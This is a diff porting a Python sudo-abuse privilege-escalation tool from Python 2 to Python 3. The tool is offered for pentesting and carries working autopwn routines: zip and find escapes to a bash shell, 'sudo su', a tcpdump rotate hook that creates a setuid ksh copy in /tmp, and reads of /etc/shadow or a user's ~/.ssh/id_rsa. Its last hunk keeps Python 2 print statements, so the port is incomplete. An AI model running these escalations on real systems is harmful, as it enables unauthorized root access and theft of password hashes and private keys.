@@ -73,11 +73,11 @@ if not os.path.exists(directory):
 	
 
 def main():
-    print OKRED + banner + ENDC
-    print OKGREEN + "Author: " + ENDC + "paragonsec @ CyberOne (https://www.criticalstart.com)"
-    print OKGREEN + "Contributors: " + ENDC + "rmirch, roman-mueller, caryhooper"
-    print OKGREEN + "Version: " + ENDC + "1.1"
-    print OKGREEN + "Description: " + ENDC + "This program aids pentesters in conducting privilege escalation on Linux by abusing sudo. Use for good or training purposes ONLY!\n"
+    print(OKRED + banner + ENDC)
+    print(OKGREEN + "Author: " + ENDC + "paragonsec @ CyberOne (https://www.criticalstart.com)")
+    print(OKGREEN + "Contributors: " + ENDC + "rmirch, roman-mueller, caryhooper")
+    print(OKGREEN + "Version: " + ENDC + "1.1")
+    print(OKGREEN + "Description: " + ENDC + "This program aids pentesters in conducting privilege escalation on Linux by abusing sudo. Use for good or training purposes ONLY!\n")
     sudopwner()
 	
 
@@ -87,19 +87,19 @@ def ask_user(answer):
     no = set(['no','n'])
 
     while True:
-        choice = raw_input(answer).lower()
+        choice = input(answer).lower()
         if choice in yes:
             return True
         elif choice in no:
             return False
         else:
-            print "Please respond with 'yes' or 'no'\n"
+            print("Please respond with 'yes' or 'no'\n")
 
 
 # Main section for sudo pwnage
 def sudopwner():
 	
-    print OKBLUE + "[+] Obtaining sudo rules for user " + username + ENDC + "\n"
+    print(OKBLUE + "[+] Obtaining sudo rules for user " + username + ENDC + "\n")
 
     # Obtaining SUDO rules
     sudofile()
@@ -108,7 +108,7 @@ def sudopwner():
     sudorules = sudoparse()
 
     # Identifying sudo rules and choosing a potential pwnage for that rule
-    print OKBLUE + "\n[+] Identifying potential pwnage... \n" + ENDC
+    print (OKBLUE + "\n[+] Identifying potential pwnage... \n" + ENDC)
     choices = []
     for item in sudorules:
         if item[3] == "ALL":
@@ -231,19 +231,19 @@ def sudopwner():
         elif 'dmesg' in item[3]:
             dmesg_user = item[0]
             choices.append('dmesg')
-	elif 'nice' in item[3]:
-	    nice_user = item[0]
-	    choices.append('nice')
+        elif 'nice' in item[3]:
+            nice_user = item[0]
+            choices.append('nice')
 
 
     # Options for the user to choose which sudo rule they wish to abuse
     for item in choices:
         if (item == "all") or (item == "sh") or (item == "bash") or (item == "ksh") or (item == "zsh"):
-            print OKRED + "[!] Vulnerable sudo rule [EASY TO PWN]: " + ENDC + item
+            print( OKRED + "[!] Vulnerable sudo rule [EASY TO PWN]: " + ENDC + item)
         else:
-            print OKRED + "[!] Vulnerable sudo rule: " + ENDC + item
+            print( OKRED + "[!] Vulnerable sudo rule: " + ENDC + item)
     
-    question = raw_input("\n" + OKBLUE + "[?] Enter name of sudo rule you wish to pwn: " + ENDC)
+    question = input("\n" + OKBLUE + "[?] Enter name of sudo rule you wish to pwn: " + ENDC)
 
     if question == "all":
         all(all_user)
@@ -336,7 +336,7 @@ def sudopwner():
     elif question == "nice":
         nice(nice_user)
     else:
-        print OKRED + "[!] No rule matching that input... exiting you n00b!" + ENDC
+        print( OKRED + "[!] No rule matching that input... exiting you n00b!" + ENDC)
         sys.exit()
 
 # Saving sudo rules to a csv file for easy parsing
@@ -349,17 +349,16 @@ def sudofile():
     # run the sudo -ll command
     # Update suggested by jesmith
     try:
-	sudoll = subprocess.check_output(['sudo' , '-ll'])
+        sudoll = subprocess.check_output(['sudo' , '-ll'], encoding='utf-8')
     except subprocess.CalledProcessError as e:
-        print e.output
-	sys.exit(1)
+        print(e.output)
+        sys.exit(1)
 
-    sudoll = subprocess.check_output(['sudo' , '-ll'])
+    sudoll = subprocess.check_output(['sudo' , '-ll'], encoding='utf-8')
 
     # Saving sudoll output to file
     f.write(sudoll)
-    f.close
-    
+    f.close()
 
 # Used to parse the contents of the sudo output
 def sudoparse():
@@ -391,14 +390,14 @@ def sudoparse():
                         sudooutput.append([runas_user, runas_group, options, cmd])
 
     # Printing out SUDO rules for the user
-    print OKGREEN + "[!] " + username + " has the following sudo rules:" + ENDC
+    print("[!] " + username + " has the following sudo rules:")
     for item in sudooutput:
-        print OKGREEN + "\n[!] RunAsUsers: " + ENDC + item[0]
+        print("[!] RunAsUsers: " + item[0])
         if item[1] != None:
-	    print OKGREEN + "[!] RunAsGroups: " + ENDC + item[1]
+            print("[!] RunAsGroups: " + item[1])
         if item[2] != None:
-            print OKGREEN + "[!] Options: " + ENDC + item[2]
-        print OKGREEN + "[!] Commands: " + ENDC + item[3]
+            print("[!] Options: " + item[2])
+        print("[!] Commands: " + item[3])
 
     return sudooutput
 
@@ -406,57 +405,55 @@ def sudoparse():
 def zip(zip_user):
 
     if args.info:
-        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
-        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
-        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
-        print OKBLUE + "[1] First we need to create a empty file to pass to the zip command: " + ENDC
-        print OKRED + " [*] touch /tmp/foo" + ENDC
-        print OKBLUE + "[2] Finally we will execute the sudo rule using the unzip-command argument: " + ENDC
+        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
+        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
+        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
+        print(OKBLUE + "[1] First we need to create a empty file to pass to the zip command: " + ENDC)
+        print(OKRED + " [*] touch /tmp/foo" + ENDC)
+        print(OKBLUE + "[2] Finally we will execute the sudo rule using the unzip-command argument: " + ENDC)
         if (zip_user == "ALL") or (zip_user == "root"):
-            print OKRED + " [*] sudo zip /tmp/foo.zip /tmp/foo -T --unzip-command='sh -c /bin/bash'" + ENDC
+            print(OKRED + " [*] sudo zip /tmp/foo.zip /tmp/foo -T --unzip-command='sh -c /bin/bash'" + ENDC)
         else:
-            print OKRED + " [*] sudo -u " + zip_user + " zip /tmp/foo.zip /tmp/foo -T --unzip-command='sh -c /bin/bash'" + ENDC
-        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
+            print(OKRED + " [*] sudo -u " + zip_user + " zip /tmp/foo.zip /tmp/foo -T --unzip-command='sh -c /bin/bash'" + ENDC)
+        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
         sys.exit()
     
     elif args.autopwn:
 
-        question = ask_user( OKRED + '\n[?] Do you wish to abuse the zip rule? ' + ENDC)
+        question = ask_user(OKRED + '\n[?] Do you wish to abuse the zip rule? ' + ENDC)
 
         if question == True:
 
             # First step of pwnage for zip
-            print OKGREEN + "\n[!] First Step: " + ENDC + "Creating /tmp/foo"
+            print(OKGREEN + "\n[!] First Step: " + ENDC + "Creating /tmp/foo")
             call('touch /tmp/foo', shell=True)
     
             sleep(0.5)
 
             # Exploit the sudo rule zip
-            print OKGREEN + "[!] Pwning ZIP rule now!!!" + ENDC
+            print(OKGREEN + "[!] Pwning ZIP rule now!!!" + ENDC)
             if (zip_user == "ALL") or (zip_user == "root"):
-                print OKGREEN + "\n[!] Getting shell as root!" + ENDC
+                print(OKGREEN + "\n[!] Getting shell as root!" + ENDC)
                 call('sudo zip /tmp/foo.zip /tmp/foo -T --unzip-command="sh -c /bin/bash"', shell=True)
             else:
-                print OKGREEN + "\n[!] Getting shell as " + zip_user + "!" + ENDC
+                print(OKGREEN + "\n[!] Getting shell as " + zip_user + "!" + ENDC)
                 call('sudo -u ' + zip_user + ' zip /tmp/foo.zip /tmp/foo -T --unzip-command="sh -c /bin/bash"', shell=True)
         
         elif question == False:
             sudopwner()
 
-
 # SUDO ALL Rule Pwnage
 def all(all_user):
-
     if args.info:
-        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
-        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
-        print OKBLUE + "[+] To pwn this rule type one of the two commands: " + ENDC
-        print OKRED + "[*] sudo -i" + ENDC
+        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
+        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
+        print(OKBLUE + "[+] To pwn this rule type one of the two commands: " + ENDC)
+        print(OKRED + "[*] sudo -i" + ENDC)
         if (all_user == "ALL") or (all_user == "root"):
-            print OKRED + "[*] sudo su" + ENDC
+            print(OKRED + "[*] sudo su" + ENDC)
         else:
-            print OKRED + "[*] sudo su " + all_user + ENDC
-        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
+            print(OKRED + "[*] sudo su " + all_user + ENDC)
+        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
         sys.exit()
     
     elif args.autopwn:
@@ -466,14 +463,14 @@ def all(all_user):
         if question == True:
 
             # Exploit the sudo rule ALL/ALL
-            print OKGREEN + "\n[!] Pwning the ALL/ALL rule now!!!" + ENDC
+            print(OKGREEN + "\n[!] Pwning the ALL/ALL rule now!!!" + ENDC)
         
-            print OKGREEN + "\n[!] Executing 'sudo su' to gain shell!" + ENDC
+            print(OKGREEN + "\n[!] Executing 'sudo su' to gain shell!" + ENDC)
             if all_user == "ALL":
-                print OKGREEN + "\n[!] Gaining shell as root!" + ENDC
+                print(OKGREEN + "\n[!] Gaining shell as root!" + ENDC)
                 call('sudo su', shell=True)
             else:
-                print OKGREEN + "\n[!] Gaining shell as " + all_user + "!" + ENDC
+                print(OKGREEN + "\n[!] Gaining shell as " + all_user + "!" + ENDC)
                 call('sudo su ' + all_user, shell=True)
     
         elif question == False:
@@ -484,31 +481,31 @@ def all(all_user):
 def find(find_user):
 
     if args.info:
-        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
-        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
-        print OKBLUE + "[+] To pwn this rule type the following command: " + ENDC
+        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
+        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
+        print(OKBLUE + "[+] To pwn this rule type the following command: " + ENDC)
         if (find_user == "ALL") or (find_user == "root"):
-            print OKRED + "[*] sudo find . -exec bash -i \;" + ENDC
+            print(OKRED + "[*] sudo find . -exec bash -i \\;" + ENDC)
         else:
-            print OKRED + "[*] sudo -u " + find_user + " find . -exec bash -i \;" + ENDC
-        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
+            print(OKRED + "[*] sudo -u " + find_user + " find . -exec bash -i \\;" + ENDC)
+        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
         sys.exit()
     
     elif args.autopwn:
 
-        question = ask_user( OKRED + '\n[?] Do you wish to abuse the find rule? ' + ENDC)
+        question = ask_user(OKRED + '\n[?] Do you wish to abuse the find rule? ' + ENDC)
 
         if question == True:
 
             # Exploit the sudo rule find
-            print OKGREEN + "\n[!] Pwning the find rule now!!!" + ENDC
-            print OKGREEN + "\n[!] Executing 'sudo find . -exec bash -i \;' to gain shell!!!" + ENDC
+            print(OKGREEN + "\n[!] Pwning the find rule now!!!" + ENDC)
+            print(OKGREEN + "\n[!] Executing 'sudo find . -exec bash -i \\;' to gain shell!!!" + ENDC)
             if (find_user == "ALL") or (find_user == "root"):
-                print OKGREEN + "\n[!] Getting shell as root!" + ENDC
-                call('sudo find . -exec bash -i \;', shell=True)
+                print(OKGREEN + "\n[!] Getting shell as root!" + ENDC)
+                call('sudo find . -exec bash -i \\;', shell=True)
             else:
-                print OKGREEN + "\n[!] Getting shell as " + find_user + "!" + ENDC
-                call('sudo -u ' + find_user + ' find . -exec bash -i \;', shell=True)
+                print(OKGREEN + "\n[!] Getting shell as " + find_user + "!" + ENDC)
+                call('sudo -u ' + find_user + ' find . -exec bash -i \\;', shell=True)
 
 
         elif question == False:
@@ -519,21 +516,21 @@ def find(find_user):
 def tcpdump(tcpdump_user):
 
     if args.info:
-        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
-        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
-        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
-        print OKBLUE + "[1] First create a malicious file in a partition that allows setuid: " + ENDC
-        print OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC
-        print OKBLUE + "[2] Next we need to change that maliciouos file to be executable: " + ENDC
-        print OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC
-        print OKBLUE + "[3] Next we will abuse the packet rotate feature of TCPDUMP in order to execute our malicious script: " + ENDC
+        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
+        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
+        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
+        print(OKBLUE + "[1] First create a malicious file in a partition that allows setuid: " + ENDC)
+        print(OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC)
+        print(OKBLUE + "[2] Next we need to change that maliciouos file to be executable: " + ENDC)
+        print(OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC)
+        print(OKBLUE + "[3] Next we will abuse the packet rotate feature of TCPDUMP in order to execute our malicious script: " + ENDC)
         if (tcpdump_user == "ALL") or (tcpdump_user == "root"):
-            print OKRED + " [*] sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z root" + ENDC
+            print(OKRED + " [*] sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z root" + ENDC)
         else:
-            print OKRED + " [*] sudo -u " + tcpdump_user + " tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z " + tcpdump_user + ENDC
-        print OKBLUE + "[4] Finally execute your /tmp/pwnage file that was created!" + ENDC
-        print OKRED + " [*] ./pwnage" + ENDC
-        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
+            print(OKRED + " [*] sudo -u " + tcpdump_user + " tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z " + tcpdump_user + ENDC)
+        print(OKBLUE + "[4] Finally execute your /tmp/pwnage file that was created!" + ENDC)
+        print(OKRED + " [*] ./pwnage" + ENDC)
+        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
         sys.exit()
     
     elif args.autopwn:
@@ -542,22 +539,22 @@ def tcpdump(tcpdump_user):
 
         if question == True:
 
-            print OKGREEN + "\n[!] Pwning the tcpdump rule now!!!" + ENDC
-            print OKGREEN + "\n[!] Creating malicous file!" + ENDC
+            print(OKGREEN + "\n[!] Pwning the tcpdump rule now!!!" + ENDC)
+            print(OKGREEN + "\n[!] Creating malicous file!" + ENDC)
             call("echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
             call("chmod +x /tmp/evil.sh",shell=True)
 
             sleep(0.5)
 
-            print OKGREEN + "\n[!] Running TCPDUMP packet rotate to execute our malicious script (read the source to see the payload)!" + ENDC
+            print(OKGREEN + "\n[!] Running TCPDUMP packet rotate to execute our malicious script (read the source to see the payload)!" + ENDC)
             if (tcpdump_user == "ALL") or (tcpdump_user == "root"):
-                print OKGREEN + "\n[!] Creating setuid shell as root!" + ENDC
+                print(OKGREEN + "\n[!] Creating setuid shell as root!" + ENDC)
                 call("sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z root", shell=True)
             else:
-                print OKGREEN + "\n[!] Creating setuid shell as " + tcpdump_user + "!" + ENDC
+                print(OKGREEN + "\n[!] Creating setuid shell as " + tcpdump_user + "!" + ENDC)
                 call("sudo -u " + tcpdump_user + " tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z " + tcpdump_user, shell=True)
 
-            print OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC
+            print(OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC)
 
         elif question == False:
             sudopwner()
@@ -1543,7 +1540,7 @@ def cat(cat_user):
                 print OKGREEN + "[!] Running cat command to get /etc/shadow contents!" + ENDC
                 call("sudo cat /etc/shadow", shell=True)
             else:
-                filename = raw_input("\n" + OKBLUE + "[?] Enter file path/name of file you wish to cat as user " + cat_user + "(e.g. /home/<user>/.ssh/id_rsa): " + ENDC)
+                filename = input("\n" + OKBLUE + "[?] Enter file path/name of file you wish to cat as user " + cat_user + "(e.g. /home/<user>/.ssh/id_rsa): " + ENDC)
                 print OKGREEN + "[!] Running cat command as " + cat_user + " to get " + filename + "!" + ENDC
                 call("sudo -u " + cat_user + " cat " + filename, shell=True)
 
